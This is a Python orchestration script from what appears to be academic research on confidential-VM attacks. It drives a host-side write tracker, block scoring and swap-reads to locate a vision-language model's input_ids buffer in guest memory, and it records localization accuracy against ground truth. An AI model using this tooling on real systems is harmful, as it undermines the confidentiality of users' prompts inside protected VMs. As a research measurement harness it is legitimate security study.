#!/usr/bin/env python3
"""
batch_orchestrate.py — Batch-mode LLM input_ids localization.

Key idea (validated): a single-inference input_ids is written once → invisible to
the write tracker (S=H*R ranks it low). A LARGE BATCH input_ids, pinned and then
REWRITTEN repeatedly inside a clean tracking window, shows up as many write runs
so its 2MB block is top-ranked by S=H*R AND stays swap-readable. One localization
then covers the whole batch; each row is one sample.

Per-batch flow:
  1. guest builds+pins a [B, seq_len] input_ids for samples [start, start+B)
     and prints layout + BUILT (image-processing write storm happens HERE, before
     tracking).
  2. host arms the write tracker on a CLEAN window, sends TRACK.
  3. guest re-writes the pinned buffer N times → tracker captures the block.
  4. guest HOLDING; host stops tracker, scores blocks S=H*R, localizes the block
     (image_pad fingerprint), reads the buffer, checks per-row recovery, releases.

Usage:
  sudo python3 batch_orchestrate.py --batch-size 128 --batch-rewrites 150 \
       --start 0 --end 3462 --output-dir batch_run
"""
import argparse
import atexit
import os
import re
import signal
import subprocess
import sys
import threading
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import common as c
from stage2_track_blocks import score_blocks_from_log, block_base_gpa, process_tracked_log
from stage3_locate_base import locate_base_gpa, read_at_fixed

RE_BATCH = re.compile(r'BATCH start=(\d+) size=(\d+) seq_len=(\d+)')
RE_BASE = re.compile(r'input_ids base GPA:\s*0x([0-9a-f]+)', re.I)
RE_ROW = re.compile(r'ROW r=(\d+) idx=(\d+) id=(\S+) N=(\d+) row_tok_off=(\d+) tok_start=(-?\d+) tok_end=(-?\d+) IND\t(.*)')

_ACTIVE_TRACKER: Optional[Tuple[subprocess.Popen, Any]] = None


def _start_tracker(log_path: Path) -> Tuple[subprocess.Popen, Any]:
    global _ACTIVE_TRACKER
    lf = open(log_path, "w", encoding="utf-8")
    proc = subprocess.Popen(
        [c.TRACKER_BIN, "--start-gpa", hex(c.TRACK_START), "--track-size", hex(c.TRACK_SIZE),
         "--duration", "1200", "--settle", str(c.TRACKER_SETTLE_S)],
        stdout=lf, stderr=subprocess.PIPE, text=True)
    _ACTIVE_TRACKER = (proc, lf)
    deadline = time.time() + c.TRACKER_SETTLE_S + 10
    while time.time() < deadline:
        line = proc.stderr.readline()
        if not line or "Settle done" in line:
            break
    threading.Thread(target=lambda: [None for _ in proc.stderr], daemon=True).start()
    return proc, lf


def _stop_tracker(proc, lf) -> None:
    global _ACTIVE_TRACKER
    if proc and proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=20)
        except Exception:
            proc.kill()
    if lf:
        try:
            lf.flush(); lf.close()
        except Exception:
            pass
    _ACTIVE_TRACKER = None


def _cleanup():
    if _ACTIVE_TRACKER is not None:
        try:
            _stop_tracker(*_ACTIVE_TRACKER)
        except Exception:
            pass


def _sig(signum, frame):
    raise SystemExit(128 + signum)


class GuestBatchLoop:
    def __init__(self, batch_size: int, batch_rewrites: int):
        self.batch_size = batch_size
        self.batch_rewrites = batch_rewrites
        self.proc: Optional[subprocess.Popen] = None

    def start(self):
        cmd = (
            f"cd {c.GUEST_CWD} && sudo env HF_HUB_OFFLINE=1 TRANSFORMERS_OFFLINE=1 "
            f"{c.GUEST_PY} -u {c.GSCRIPT} --model_id Qwen/Qwen2-VL-2B-Instruct "
            f"--gpa-only --calibrate --stdin-loop-batch --batch-size {self.batch_size} "
            f"--batch-rewrites {self.batch_rewrites}"
        )
        print("[guest-batch] launching persistent guest batch loop...")
        self.proc = subprocess.Popen(c.SSH_CMD + [cmd], stdin=subprocess.PIPE,
                                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                     text=True, bufsize=1)
        for line in self.proc.stdout:
            if "LOOP_READY" in line:
                print("[guest-batch] LOOP_READY")
                return
        raise RuntimeError("guest batch loop failed to reach LOOP_READY")

    def build(self, start_index: int) -> Dict[str, Any]:
        """Send START; read until BUILT. Returns batch layout (base, seq_len, rows)."""
        if self.proc is None or self.proc.poll() is not None:
            self.start()
        self.proc.stdin.write(f"{start_index}\n")
        self.proc.stdin.flush()
        info: Dict[str, Any] = {"base": None, "seq_len": None, "rows": []}
        for l in self.proc.stdout:
            if l.startswith("LOOP_ERR"):
                info["error"] = l.strip()
                return info
            m = RE_BATCH.search(l)
            if m:
                info["seq_len"] = int(m.group(3))
            m = RE_BASE.search(l)
            if m and info["base"] is None:
                info["base"] = int(m.group(1), 16)
            m = RE_ROW.search(l)
            if m:
                info["rows"].append({
                    "r": int(m.group(1)), "idx": int(m.group(2)), "id": m.group(3),
                    "N": int(m.group(4)), "row_tok_off": int(m.group(5)),
                    "tok_start": int(m.group(6)), "tok_end": int(m.group(7)),
                    "ind": m.group(8).strip(),
                })
            if "BUILT" in l:
                break
        return info

    def track_and_hold(self):
        """Send TRACK (tracker already armed); read until HOLDING (rewrites done)."""
        self.proc.stdin.write("TRACK\n")
        self.proc.stdin.flush()
        for l in self.proc.stdout:
            if l.startswith("LOOP_ERR"):
                return False
            if "HOLDING" in l:
                return True
        return False

    def release(self):
        if self.proc and self.proc.poll() is None:
            self.proc.stdin.write("NEXT\n")
            self.proc.stdin.flush()
            for l in self.proc.stdout:
                if "RELEASED" in l:
                    break

    def close(self):
        if self.proc and self.proc.poll() is None:
            try:
                self.proc.stdin.write("QUIT\n")
                self.proc.stdin.flush()
                self.proc.wait(timeout=10)
            except Exception:
                self.proc.kill()
        self.proc = None


def main():
    atexit.register(_cleanup)
    signal.signal(signal.SIGTERM, _sig)
    signal.signal(signal.SIGINT, _sig)

    p = argparse.ArgumentParser()
    p.add_argument("--batch-size", type=int, default=128)
    p.add_argument("--batch-rewrites", type=int, default=150)
    p.add_argument("--start", type=int, default=0)
    p.add_argument("--end", type=int, default=3462)
    p.add_argument("--output-dir", type=Path, default=c.PIPELINE_DIR / "batch_run")
    args = p.parse_args()

    # Batch input_ids is written by repeated full-buffer rewrites -> it is ONE
    # large run (hundreds of pages), not a short single-sample run. Widen the
    # run-length filter so the localizer scans that big run (image_pad is dense
    # throughout it) instead of excluding it and falling onto a wrong-block
    # false positive.
    c.LOC_RUN_LEN_MAX = 4096

    out = args.output_dir
    out.mkdir(parents=True, exist_ok=True)
    csv_path = out / "batch_summary.csv"
    done_starts = set()
    if csv_path.exists():
        for line in csv_path.read_text().splitlines()[1:]:
            try:
                done_starts.add(int(line.split(",")[0]))
            except Exception:
                pass
    else:
        csv_path.write_text("start,batch_base,batch_block,host_base,loc_block,loc_match,"
                            "gt_rank,loc_swaps,rows,rows_recovered,elapsed_sec\n")

    print("=" * 70)
    print("  BATCH LOCALIZATION ORCHESTRATOR")
    print(f"  batch_size={args.batch_size} rewrites={args.batch_rewrites} "
          f"range=[{args.start},{args.end}) -> {out}")
    print("=" * 70)

    # ICMP calibration on a quiescent guest (FIXED_GPA + image_pad reference).
    c.run_net_preflight()
    c.ensure_mtu_9000()
    from mura_dict_build import acquire_gpa, drain_rxbuf
    from stage1_prepare_dict import acquire_imagepad_reference
    drain_rxbuf(rounds=3)
    fixed_gpa = acquire_gpa(None)
    ip_ref, ip_mask = acquire_imagepad_reference(fixed_gpa)
    print(f"[calib] Image-Pad reference ready: {len(ip_mask)}/256")

    guest = GuestBatchLoop(args.batch_size, args.batch_rewrites)
    guest.start()
    pacer = c.Pacer()
    tracker_log = c.LLM_DIR / "e2e_batch_wpt.log"

    starts = [s for s in range(args.start, args.end, args.batch_size) if s not in done_starts]
    print(f"[orch] {len(starts)} batches to process")

    try:
        for start in starts:
            t0 = time.time()
            print("\n" + "=" * 70)
            print(f"  [BATCH] start={start}")
            info = guest.build(start)
            if info.get("error") or info["base"] is None:
                print(f"  [!] build failed: {info.get('error')}")
                continue
            base = info["base"]
            seq_len = info["seq_len"]
            rows = info["rows"]
            batch_block = block_base_gpa(base)
            print(f"  built: base=0x{base:x} block=0x{batch_block:x} seq_len={seq_len} rows={len(rows)}")

            # arm tracker on the clean window, then rewrite+hold
            tp, tlf = _start_tracker(tracker_log)
            ok = guest.track_and_hold()
            _stop_tracker(tp, tlf)
            if not ok:
                print("  [!] track/hold failed")
                guest.release()
                continue

            # score + localize (S=H*R ranking, image_pad recognition)
            st2 = process_tracked_log(start, str(tracker_log),
                                      {"base": base, "ind": None, "N": None},
                                      top_k=25, out_dir=out, start_offset=0, rank_mode="score")
            gt_rank = st2.get("gt_rank")
            cand_blks = [int(x, 16) for x in st2.get("candidate_blocks", [])]
            host_base, loc_swaps, strat, best_hits = locate_base_gpa(
                fixed_gpa=fixed_gpa, ip_ref=ip_ref, ip_mask=ip_mask,
                tracker_candidates=cand_blks, known_blocks={}, recency_list=[], pacer=pacer,
                candidate_run_bases=st2.get("candidate_run_bases", {}),
                candidate_runs=st2.get("candidate_runs", {}),
                bootstrap_block=None, blind=True)
            loc_block = block_base_gpa(host_base) if host_base else None
            loc_match = (loc_block == batch_block) if host_base else False
            print(f"  gt_rank={gt_rank} host_base={'0x%x'%host_base if host_base else None} "
                  f"loc_block={'0x%x'%loc_block if loc_block else None} match={loc_match} "
                  f"strat={strat} swaps={loc_swaps} best_hits={best_hits}")

            # Localization-only: we measure WHERE the input_ids buffer is, across
            # the whole batch. Content recovery (ciphertext dict-match) is out of
            # scope here, so no per-row swap-read (keeps swaps low / QEMU safe).
            rows_recovered = 0

            guest.release()
            elapsed = time.time() - t0
            with open(csv_path, "a") as f:
                f.write(f"{start},0x{base:x},0x{batch_block:x},"
                        f"{'0x%x'%host_base if host_base else ''},"
                        f"{'0x%x'%loc_block if loc_block else ''},{loc_match},"
                        f"{gt_rank},{loc_swaps},{len(rows)},{rows_recovered},{round(elapsed,1)}\n")
            print(f"  [BATCH done] {elapsed:.1f}s -> {csv_path}")
    finally:
        guest.close()

    print("\n[orch] complete")


if __name__ == "__main__":
    main()
